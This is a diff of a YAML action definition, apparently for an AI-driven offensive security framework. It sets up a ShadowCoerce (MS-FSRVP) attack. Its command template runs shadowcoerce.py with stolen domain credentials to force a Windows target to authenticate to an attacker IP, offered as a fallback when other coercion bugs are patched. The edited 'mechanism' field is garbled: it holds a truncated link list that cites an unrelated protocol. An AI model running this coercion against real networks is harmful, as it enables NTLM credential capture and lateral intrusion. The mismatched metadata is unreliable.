@@ -2,16 +2,19 @@ name: shadowcoerce
 category: services
 description: ShadowCoerce (MS-FSRVP)
 preconditions:
-  - os==windows
-  - has_cred
+- os==windows
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 shadowcoerce.py -d {domain} -u '{username}' -p '{password}' {attacker_ip} {target_ip}"
+command_template: python3 shadowcoerce.py -d {domain} -u '{username}' -p '{password}'
+  {attacker_ip} {target_ip}
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "MS-FSRVP File Server VSS Agent service coercion. Forces NTLM auth callback. Alternative when PrinterBug/PetitPotam are patched."
+mechanism: '- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
+  - [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.'
+hacktricks_ref: windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
